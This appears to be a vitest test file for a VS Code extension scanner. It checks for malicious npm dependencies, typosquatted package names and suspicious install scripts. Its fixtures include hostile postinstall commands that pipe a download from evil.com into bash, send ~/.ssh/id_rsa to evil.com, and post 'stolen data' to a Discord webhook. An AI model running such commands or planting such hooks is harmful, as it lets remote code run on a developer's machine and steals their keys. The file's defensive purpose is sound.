import { describe, expect, it } from "vitest";
import type { VsixContents, VsixManifest, ZooData } from "../types.js";
import {
  checkDependencies,
  checkLifecycleScripts,
  checkMaliciousPackages,
  checkTyposquattingPackages,
} from "./dependencies.js";

function makePackageJson(content: object): string {
  return JSON.stringify(content, null, 2);
}

function makeContents(packageJsonContent: object): VsixContents {
  const manifest: VsixManifest = {
    name: "test-extension",
    publisher: "test",
    version: "1.0.0",
  };

  const files = new Map<string, Buffer>();
  files.set("package.json", Buffer.from(makePackageJson(packageJsonContent), "utf8"));

  return { manifest, files, basePath: "/test" };
}

function makeZooData(maliciousPackages: string[] = []): ZooData {
  return {
    blocklist: [],
    hashes: new Set(),
    domains: new Set(),
    ips: new Set(),
    maliciousNpmPackages: new Set(maliciousPackages.map((p) => p.toLowerCase())),
  };
}

describe("checkMaliciousPackages", () => {
  it("detects known malicious packages in dependencies", () => {
    const packageJson = {
      dependencies: {
        express: "^4.0.0",
        "event-stream": "^3.3.4",
      },
    };

    const findings = checkMaliciousPackages(packageJson, new Set(["event-stream"]));

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.id === "MALICIOUS_NPM_PACKAGE")).toBe(true);
    expect(findings.some((f) => f.severity === "critical")).toBe(true);
    expect(findings.some((f) => f.metadata?.["package"] === "event-stream")).toBe(true);
  });

  it("detects malicious packages in devDependencies", () => {
    const packageJson = {
      devDependencies: {
        jest: "^29.0.0",
        "ua-parser-js": "^0.7.0",
      },
    };

    const findings = checkMaliciousPackages(packageJson, new Set(["ua-parser-js"]));

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.metadata?.["package"] === "ua-parser-js")).toBe(true);
  });

  it("is case-insensitive", () => {
    const packageJson = {
      dependencies: {
        "Event-Stream": "^3.3.4",
      },
    };

    const findings = checkMaliciousPackages(packageJson, new Set(["event-stream"]));

    expect(findings).toHaveLength(1);
  });

  it("returns empty array for clean dependencies", () => {
    const packageJson = {
      dependencies: {
        express: "^4.0.0",
        lodash: "^4.0.0",
      },
    };

    const findings = checkMaliciousPackages(packageJson, new Set(["event-stream"]));

    expect(findings).toHaveLength(0);
  });
});

describe("checkTyposquattingPackages", () => {
  it("detects known typosquats", () => {
    const packageJson = {
      dependencies: {
        lodahs: "^4.0.0", // typosquat of lodash
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.id === "TYPOSQUAT_PACKAGE")).toBe(true);
    expect(findings.some((f) => f.severity === "high")).toBe(true);
    expect(findings.some((f) => f.metadata?.["similar_to"] === "lodash")).toBe(true);
  });

  it("detects crossenv typosquat", () => {
    const packageJson = {
      dependencies: {
        crossenv: "^7.0.0", // typosquat of cross-env
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.metadata?.["similar_to"] === "cross-env")).toBe(true);
  });

  it("detects typosquats by edit distance", () => {
    const packageJson = {
      dependencies: {
        expres: "^4.0.0", // 1 char different from express
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.metadata?.["similar_to"] === "express")).toBe(true);
    const finding = findings.find((f) => f.id === "TYPOSQUAT_PACKAGE");
    const distance = finding?.metadata?.["edit_distance"];
    expect(typeof distance === "number" && distance <= 2).toBe(true);
  });

  it("does not flag legitimate packages", () => {
    const packageJson = {
      dependencies: {
        express: "^4.0.0",
        lodash: "^4.0.0",
        react: "^18.0.0",
      },
    };

    const findings = checkTyposquattingPackages(packageJson);

    expect(findings).toHaveLength(0);
  });
});

describe("checkLifecycleScripts", () => {
  it("detects postinstall script", () => {
    const packageJson = {
      scripts: {
        postinstall: "echo 'installed'",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.id === "LIFECYCLE_SCRIPT")).toBe(true);
    expect(findings.some((f) => f.severity === "medium")).toBe(true);
    expect(findings.some((f) => f.metadata?.["script"] === "postinstall")).toBe(true);
  });

  it("detects preinstall script", () => {
    const packageJson = {
      scripts: {
        preinstall: "node setup.js",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.metadata?.["script"] === "preinstall")).toBe(true);
  });

  it("detects malicious curl pipe to bash", () => {
    const packageJson = {
      scripts: {
        postinstall: "curl https://evil.com/script.sh | bash",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    expect(findings).toHaveLength(1);
    expect(findings.some((f) => f.id === "MALICIOUS_LIFECYCLE_SCRIPT")).toBe(true);
    expect(findings.some((f) => f.severity === "critical")).toBe(true);
  });

  it("detects SSH key access in scripts", () => {
    const packageJson = {
      scripts: {
        postinstall: "cat ~/.ssh/id_rsa | curl -d @- https://evil.com",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    const maliciousFinding = findings.find((f) => f.id === "MALICIOUS_LIFECYCLE_SCRIPT");
    expect(maliciousFinding).toBeDefined();
    expect(maliciousFinding?.metadata?.["pattern"]).toBe("SSH key access");
  });

  it("detects Discord webhook in scripts", () => {
    const packageJson = {
      scripts: {
        postinstall:
          "curl -X POST https://discord.com/api/webhooks/123/abc -d 'stolen data'",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    const maliciousFinding = findings.find((f) => f.id === "MALICIOUS_LIFECYCLE_SCRIPT");
    expect(maliciousFinding).toBeDefined();
  });

  it("ignores non-lifecycle scripts", () => {
    const packageJson = {
      scripts: {
        build: "tsc",
        test: "jest",
        start: "node index.js",
      },
    };

    const findings = checkLifecycleScripts(packageJson);

    expect(findings).toHaveLength(0);
  });
});

describe("checkDependencies (integration)", () => {
  it("runs all checks on a malicious package.json", () => {
    const contents = makeContents({
      name: "evil-extension",
      dependencies: {
        "event-stream": "^3.3.4", // Known malicious
        lodahs: "^4.0.0", // Typosquat
      },
      scripts: {
        postinstall: "curl https://evil.com | bash", // Malicious script
      },
    });

    const zooData = makeZooData(["event-stream"]);
    const findings = checkDependencies(contents, zooData);

    expect(findings.some((f) => f.id === "MALICIOUS_NPM_PACKAGE")).toBe(true);
    expect(findings.some((f) => f.id === "TYPOSQUAT_PACKAGE")).toBe(true);
    expect(findings.some((f) => f.id === "MALICIOUS_LIFECYCLE_SCRIPT")).toBe(true);
  });

  it("returns empty array for clean extension", () => {
    const contents = makeContents({
      name: "good-extension",
      dependencies: {
        express: "^4.0.0",
        lodash: "^4.0.0",
      },
      scripts: {
        build: "tsc",
        test: "jest",
      },
    });

    const zooData = makeZooData();
    const findings = checkDependencies(contents, zooData);

    expect(findings).toHaveLength(0);
  });

  it("handles missing package.json", () => {
    const manifest: VsixManifest = {
      name: "test-extension",
      publisher: "test",
      version: "1.0.0",
    };
    const contents: VsixContents = {
      manifest,
      files: new Map(),
      basePath: "/test",
    };

    const zooData = makeZooData();
    const findings = checkDependencies(contents, zooData);

    expect(findings).toHaveLength(0);
  });

  it("handles invalid package.json", () => {
    const manifest: VsixManifest = {
      name: "test-extension",
      publisher: "test",
      version: "1.0.0",
    };
    const files = new Map<string, Buffer>();
    files.set("package.json", Buffer.from("not valid json", "utf8"));
    const contents: VsixContents = { manifest, files, basePath: "/test" };

    const zooData = makeZooData();
    const findings = checkDependencies(contents, zooData);

    expect(findings).toHaveLength(0);
  });
});
